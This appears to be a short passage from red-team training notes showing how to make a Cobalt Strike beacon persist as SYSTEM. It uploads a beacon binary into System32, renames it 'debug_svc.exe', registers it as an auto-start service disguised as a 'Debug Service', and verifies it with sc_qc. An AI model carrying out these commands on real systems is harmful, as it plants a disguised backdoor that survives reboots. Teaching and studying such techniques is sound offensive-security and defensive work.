An adversary can also create a Windows service to run a payload under the context of SYSTEM, which will start when the computer boots up.

```powershell
beacon> cd C:\Windows\System32\
beacon> upload C:\Payloads\beacon_x64.svc.exe
beacon> mv beacon_x64.svc.exe debug_svc.exe

beacon> sc_create dbgsvc "Debug Service" C:\Windows\System32\debug_svc.exe "Windows Debug Service" 0 2 3

 create_service:
  hostname:     
  servicename:  dbgsvc
  displayname:  Debug Service
  binpath:      C:\Windows\System32\debug_svc.exe
  newdesc:      The Windows Debug Service
  desclen:      26
  ignoremode:   0
  startmode:    2
  service_type: 10
SUCCESS.
```

Use `sc_qc` to verify that the service was created successfully.

```powershell
beacon> sc_qc dbgsvc

SERVICE_NAME: dbgsvc
	TYPE                 : 10 WIN32_OWN
	START_TYPE           : 2 AUTO_START
	ERROR_CONTROL        : 0 IGNORE
	BINARY_PATH_NAME     : C:\Windows\System32\debug_svc.exe
	LOAD_ORDER_GROUP     : 
	TAG                  : 0
	DISPLAY_NAME         : Debug Service
	DEPENDENCIES         : 
	SERVICE_START_NAME   : LocalSystem
	CURRENT_STATUS       : STOPPED
```